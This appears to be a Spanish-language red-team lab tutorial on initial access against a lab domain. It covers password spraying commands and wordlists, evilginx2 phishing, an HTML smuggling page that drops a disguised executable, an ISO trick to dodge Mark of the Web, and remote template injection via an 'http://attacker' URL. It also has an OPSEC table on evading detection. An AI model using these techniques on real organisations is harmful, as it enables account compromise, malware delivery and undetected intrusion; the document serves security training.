# Tradecraft — Operación FIRST CONTACT
## Lab-09: Initial Access — Password Spraying, Phishing y HTML Smuggling

**Operación:** FIRST CONTACT | **Adversario:** Lazarus Group | **Nivel:** Red Team Operations  
**Autor:** Adrián Camacho | **Versión:** 1.0 | **Fecha:** Mayo 2026

---

## Índice

1. [Reconocimiento externo — OSINT para Initial Access](#1-reconocimiento-externo)
2. [Password Spraying — Acceso sin bloquear cuentas](#2-password-spraying)
3. [Phishing — Ingeniería social técnica](#3-phishing)
4. [HTML Smuggling — Bypass de proxies y filtros](#4-html-smuggling)
5. [VBA Macros — Office como vector](#5-vba-macros)
6. [Remote Template Injection](#6-remote-template-injection)
7. [OPSEC — Initial Access sigiloso](#7-opsec)

---

## 1. Reconocimiento externo — OSINT para Initial Access

### ¿Por qué el OSINT es el primer paso real?

En un engagement sin credenciales previas, el OSINT determina:
- Qué usuarios existen (para el spraying)
- Qué tecnologías usa la empresa (para exploits específicos)
- Qué información puede usarse para un phishing convincente
- Qué dominios y subdominios están expuestos

### Enumeración de usuarios via OSINT

```bash
# LinkedIn — buscar empleados de la empresa
# Hunter.io — encontrar formatos de email corporativo
# theHarvester
theHarvester -d atackcorp.local -b linkedin,google,bing

# Verificar formato de email
# Si encontramos: roberto.martinez@atackcorp.local
# El formato es: nombre.apellido@dominio
# Podemos generar lista de usuarios del AD sin autenticación
```

### Enumeración de usuarios via Kerberos (sin credenciales)

```bash
# Kerbrute — enumerar usuarios válidos via AS-REQ
kerbrute userenum --dc 10.0.2.10 -d atackcorp.local userlist.txt

# AS-REQ revela si un usuario existe:
# Usuario válido → KDC responde (con o sin pre-auth)
# Usuario inválido → KDC responde KDC_ERR_C_PRINCIPAL_UNKNOWN
```

### Reconocimiento de infraestructura

```bash
# DNS enumeration
dnsenum atackcorp.local
dnsrecon -d atackcorp.local -t axfr

# Subdomain enumeration
subfinder -d atackcorp.local
amass enum -d atackcorp.local

# Shodan/Censys — servicios expuestos
shodan search "atackcorp.local"

# Certificados — revelan subdominios (crt.sh)
curl "https://crt.sh/?q=atackcorp.local&output=json" | jq '.[].name_value'
```

---

## 2. Password Spraying — Acceso sin bloquear cuentas

### ¿Por qué spraying en lugar de brute force?

El brute force prueba muchas contraseñas contra una cuenta — activa el lockout rápidamente. El password spraying prueba **una o pocas contraseñas contra muchas cuentas** — bajo volumen por cuenta, evita el lockout.

### La lógica detrás del spraying

Las contraseñas corporativas siguen patrones predecibles:
- `Empresa+Año+!` → `Atackcorp2024!`
- `Estacion+Año+!` → `Verano2024!`, `Enero2025!`
- `Bienvenido+!` → `Welcome2024!`, `Bienvenido1`
- Contraseña por defecto del sistema

En una empresa de 100 empleados, estadísticamente 3-5 usarán una contraseña predecible.

### Política de lockout — calcular el timing

```
Threshold: 5 intentos fallidos → lockout de 30 minutos
Observación: contador se resetea tras 15 minutos de inactividad

Estrategia segura: 1 intento por cuenta cada 16 minutos
→ nunca superas el threshold
→ puedes hacer 3-4 rondas de spraying en una jornada
```

### Con Kerbrute

```bash
# Obtener lista de usuarios válidos primero
kerbrute userenum --dc 10.0.2.10 -d atackcorp.local users.txt -o valid_users.txt

# Spraying — 1 contraseña por ronda
kerbrute passwordspray --dc 10.0.2.10 -d atackcorp.local valid_users.txt "Atackcorp2024!"
kerbrute passwordspray --dc 10.0.2.10 -d atackcorp.local valid_users.txt "Verano2024!"

# Respetar lockout — esperar entre rondas
sleep 960  # 16 minutos
```

### Con NetExec (SMB spraying)

```bash
# Spraying via SMB
nxc smb 10.0.2.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Spraying via WinRM
nxc winrm 10.0.2.10 -u users.txt -p passwords.txt --no-bruteforce
```

### Wordlist OSINT para spraying

```bash
# Construir wordlist basada en OSINT de la empresa
cat > spray_list.txt << EOF
Atackcorp2024!
Atackcorp2025!
AtackCorp2024!
Enero2025!
Verano2024!
Otono2024!
Welcome2024!
Welcome2025!
Password2024!
Bienvenido1
Empresa2024!
EOF
```

---

## 3. Phishing — Ingeniería social técnica

### Tipos de phishing en Red Team

| Tipo | Complejidad | Efectividad | OPSEC |
|------|-------------|-------------|-------|
| Credential harvesting | Baja | Alta | Media |
| Malicious attachment | Media | Alta | Baja (detectado por filtros) |
| HTML Smuggling | Alta | Muy alta | Alta |
| Spear phishing (CEO fraud) | Alta | Muy alta | Alta |

### Infraestructura de phishing

Un phishing profesional requiere:
1. **Dominio convincente** — `atackcorp-helpdesk.com`, `portal-atackcorp.es`
2. **Certificado SSL válido** — Let's Encrypt es suficiente
3. **MX records** — para enviar emails
4. **SPF/DKIM/DMARC** — para evitar filtros de spam

```bash
# Registrar dominio typosquatted
# atackcorp-portal.com, atackcorpltd.com, atack-corp.com

# GoPhish — plataforma de phishing
# Configurar smtp, landing page, email template, users list
```

### Landing Page convincente

La landing page debe imitar exactamente el portal real de la empresa (VPN, webmail, intranet). Herramientas como `evilginx2` actúan como proxy inverso y capturan cookies de sesión, bypassando MFA.

```bash
# Evilginx2 — proxy inverso para phishing con bypass MFA
evilginx2 -p /path/to/phishlets
# Configura phishlet para portal.atackcorp.local
# Captura cookies de sesión completas
```

---

## 4. HTML Smuggling — Bypass de proxies y filtros

### ¿Qué es HTML Smuggling?

HTML Smuggling es una técnica que embebe el payload directamente en el HTML usando JavaScript para reconstruirlo en el cliente. Los filtros y proxies que inspeccionan el tráfico HTTP ven solo HTML + JS legítimo — el payload se ensambla en el navegador de la víctima.

### Por qué bypasa los filtros

Los proxies de seguridad (Blue Coat, Zscaler, etc.) inspeccionan el contenido de las descargas. Si el archivo malicioso viaja directamente, lo detectan. Con HTML Smuggling:

```
Servidor → HTML + JavaScript (legítimo) → Proxy (no detecta nada) → Navegador
                                                                         ↓
                                                            JS ensambla el payload
                                                                         ↓
                                                            Download automático del .exe/.iso/.zip
```

### Implementación básica

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Payload en base64 (en producción, ofuscado)
var payload = "TVqQAAMAAAA..."; // Base64 del ejecutable

// Convertir a blob y descargar automáticamente
var bytes = atob(payload);
var array = new Uint8Array(bytes.length);
for (var i = 0; i < bytes.length; i++) {
    array[i] = bytes.charCodeAt(i);
}
var blob = new Blob([array], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);

var link = document.createElement('a');
link.href = url;
link.download = 'Invoice_2026.exe';
document.body.appendChild(link);
link.click();
</script>
<p>Por favor descargue e instale la actualización requerida.</p>
</body>
</html>
```

### ISO/IMG como container

Embeber el payload en un archivo ISO elimina la advertencia de Mark of the Web (MOTW) que Windows añade a archivos descargados de Internet, ya que los archivos dentro de un ISO montado no heredan el MOTW del ISO.

```
payload.exe → payload.iso → HTML Smuggling → descarga → usuario monta ISO → ejecuta payload.exe (sin MOTW)
```

---

## 5. VBA Macros — Office como vector

### El estado de las macros en 2024+

Microsoft deshabilitó las macros de documentos de Internet por defecto en Office 2022+. Sin embargo:
- Documentos de red local (`\\server\share\`) siguen funcionando
- Documentos en zonas de confianza definidas por el usuario
- Documentos con VBA firmado digitalmente
- Organizaciones que han revertido el cambio por compatibilidad

### Alternativas post-bloqueo de macros

```
XLM Macros (Excel 4.0) → más antiguas, menos bloqueadas que VBA
Office Add-ins → extensiones que persisten en el perfil del usuario
MSDT (Follina) → explotar el protocolo ms-msdt en documentos Office
OneNote → embeber scripts ejecutables en notebooks
```

### Técnica: Remote Template Injection

En lugar de embeber el payload directamente en el documento (detectado por AV), el documento descarga la plantilla con las macros en el momento de abrirse.

```
Documento Word limpio (no detectado por AV)
    ↓ al abrirse, descarga plantilla remota
    ↓ http://attacker/template.dotm
    ↓ plantilla contiene macros
    → Macros ejecutan payload
```

El documento inicial pasa los filtros porque no contiene código malicioso. Las macros se descargan en el momento de uso.

---

## 6. Remote Template Injection

### ¿Cómo funciona?

Los documentos Word guardan la ruta de su plantilla (`Normal.dotm` por defecto) en `word/_rels/settings.xml.rels`. Si cambiamos esta ruta a una URL remota, Word descargará la plantilla al abrirse.

### Implementación

```bash
# 1. Crear documento Word normal (.docx)
# 2. Modificar el relationships file
# descomprimir el .docx (es un ZIP)
unzip documento.docx -d doc_temp

# editar word/_rels/settings.xml.rels
# cambiar Target de la plantilla a URL maliciosa:
# Target="http://attacker/template.dotm"

# 3. Recomprimir
cd doc_temp && zip -r ../documento_malicioso.docx .

# 4. Servir la plantilla maliciosa
# template.dotm contiene AutoOpen() con el payload
```

### Ventajas sobre macros directas

- El documento inicial no contiene código malicioso → pasa sandbox analysis
- La plantilla se descarga en el momento de apertura → payload siempre actualizado
- Dificulta la atribución → el documento enviado es "limpio"

---

## 7. OPSEC — Initial Access sigiloso

### Principios de Lazarus Group para Initial Access

1. **Reconocimiento extenso antes de atacar** — semanas de OSINT antes del primer intento
2. **Infraestructura desechable** — dominios y servidores usados una sola vez
3. **Timing** — atacar durante horas laborables del objetivo (parece tráfico legítimo)
4. **Payloads multicapa** — stager pequeño → downloader → beacon real
5. **Certificados válidos** — el tráfico C2 parece HTTPS legítimo

### Señales de detección de Initial Access

| Técnica | Señal | Mitigación |
|---------|-------|------------|
| Password Spraying | Muchos 4625 (failed logon) con misma password | Espaciar intentos, distribuir fuentes |
| Phishing credential harvest | Acceso desde IP inusual tras login | Usar VPN residencial como exit node |
| HTML Smuggling | Download de blob: URL en proxy logs | Usar dominio categorizado (no nuevo) |
| Macro execution | 4688 proceso sospechoso hijo de Office | Usar técnicas sin macros (Follina, ISO) |
| Remote Template | DNS query a dominio sospechoso | Usar dominio pre-aged con historial |

### Domain aging — Por qué importar

Los dominios nuevos son inmediatamente sospechosos. Registrar el dominio de phishing 6+ meses antes del engagement, generar tráfico artificial y asegurarse de que esté categorizado como legítimo antes de usarlo.

---

## Referencias

- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [Evilginx2 — MFA bypass phishing](https://github.com/kgretzky/evilginx2)
- [HTML Smuggling — MDSec](https://www.mdsec.co.uk/2021/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
- [MITRE ATT&CK — Lazarus Group](https://attack.mitre.org/groups/G0032/)
- [GoPhish — Phishing framework](https://getgophish.com/)

---

*Operación FIRST CONTACT — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*